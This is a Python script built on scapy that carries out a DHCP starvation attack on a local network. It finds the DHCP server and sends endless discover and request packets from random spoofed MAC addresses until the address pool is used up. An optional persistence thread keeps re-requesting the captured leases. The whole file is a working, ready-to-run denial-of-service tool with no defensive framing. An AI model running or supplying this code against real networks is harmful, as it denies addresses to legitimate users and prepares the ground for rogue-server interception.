import argparse
import subprocess
import threading
import time
from scapy.all import conf, Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, sniff, ARP, srp

lease = {}
def get_dhcp_server_ip(iface):
    pkt = (
        Ether(dst="FF:FF:FF:FF:FF:FF") /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=RandMAC()) /
        DHCP(options=[('message-type', 'discover'), 'end'])
    )

    sendp(pkt, iface=iface, verbose=0)
    pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)[0]
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2:
        return pkt[IP].src
    return None
##todo - make the thread work on copy of lease dict
def renew_leases(iface, target_ip):
    global lease
    while True:
        for ip, mac in lease.items():
            pkt_request = (
                Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
                IP(src='0.0.0.0', dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac) /
                DHCP(options=[('message-type', 'request'),
                              ('requested_addr', ip),   
                              ('server_id', target_ip), 
                                'end'])
            )
            sendp(pkt_request, iface=iface, verbose=0)
        time.sleep(10)

def attack_dhcp_server(iface, target_ip, persistence=False): 
    global lease
    print(f"Starting DHCP Starvation Attack on {target_ip} ...")
    if persistence:
        print("--- Persistence Mode ENABLED ---")
        t =threading.Thread(target=renew_leases, args=(iface, target_ip))
        t.daemon = True
        t.start()


    while True:
        mac = RandMAC()
        pkt_discover = (
            Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac) /
            DHCP(options=[('message-type', 'discover'), 'end'])
        )
        sendp(pkt_discover, iface=iface, verbose=0)
        offer_pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)
        if offer_pkt:
            ans = offer_pkt[0]
            offered_ip = ans[BOOTP].yiaddr
            print(f"Requested IP: {offered_ip} with MAC: {mac}")
            
            if persistence:
                lease[offered_ip] = mac


            pkt_request = (
                Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
                IP(src='0.0.0.0', dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac) /
                DHCP(options=[
                    ('message-type', 'request'),
                    ('requested_addr', offered_ip),
                    ('server_id', target_ip),
                    'end'
                ])
            )
            sendp(pkt_request, iface=iface, verbose=0)


def main():
    
    argv_parser = argparse.ArgumentParser(
        prog='DHCPStarvationNEW.py',
        description='DHCP Starvation',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    
    argv_parser.add_argument(
        '-p', '--persist',
        action='store_true', 
        help='persistant?',   
        required=False
    )

    argv_parser.add_argument(
        '-i', '--iface',
        help='Interface you wish to use',
        required=False
    )
    argv_parser.add_argument(
        '-t', '--target',
        help='IP of target server',
        required=False
    )

    argv = argv_parser.parse_args()
    iface = argv.iface if argv.iface else conf.iface
    if not iface:
        print("Unable to get default interface")
        exit(0)

    print(f"Searching DHCP server's IP address for IFACE {iface} ...")
    tar_ip = argv.target if argv.target else get_dhcp_server_ip(iface)
    if not tar_ip:
        print("Unable to get DHCP server's IP address")
        exit(0)

    print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")
    
    # העברת מצב הדגל לפונקציה הראשית
    attack_dhcp_server(iface, tar_ip, argv.persist)


if __name__ == "__main__":
    main()